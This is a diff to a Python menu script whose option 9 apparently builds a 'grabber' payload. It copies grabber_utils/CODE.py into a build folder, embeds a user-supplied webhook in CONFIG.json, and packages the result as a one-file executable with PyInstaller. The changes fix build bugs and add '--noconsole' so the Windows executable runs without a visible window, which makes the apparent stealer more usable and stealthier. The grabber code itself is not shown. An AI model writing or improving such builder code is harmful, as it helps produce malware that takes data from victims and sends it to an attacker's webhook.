@@ -234,7 +234,11 @@ try:
         sys.exit()
         pass
     elif choice == 9:
-      os.mkdir("build")
+      try:
+        shutil.rmtree("./build/")
+      except:
+        print("First build detected hehe")
+      os.mkdir("./build/")
       shutil.copy("./grabber_utils/CODE.py", "./build/")
       filename= input("Name of the file: ")
       os.rename("./build/CODE.py", f"./build/{filename}.py")
@@ -242,16 +246,16 @@ try:
       webhook_cfg = {
         "WEBHOOK":webhook_to_cfg
       }
-      webhook_ready = json.dump(webhook_cfg)
+      webhook_ready = json.dumps(webhook_cfg)
       with open("./build/CONFIG.json","w") as f:
         f.write(webhook_ready)
         f.close()
       if platform.system() == "Windows":
         import PyInstaller.__main__
-        PyInstaller.__main__.run(["./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.","--clean","--workpath=./build/"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json;.","--clean","--workpath=./build/","--noconsole"])
       else:
         import PyInstaller.__main__
-        PyInstaller.__main__.run(["./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.","--clean","--workpath=/build/"])
+        PyInstaller.__main__.run([f"./build/{filename}.py", "--onefile","--add-data=./build/CONFIG.json:.","--clean","--workpath=./build/"])
     elif choice == 99:
         Write.Print(f'''
       ██╗███████╗ ██████╗ ██╗      █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
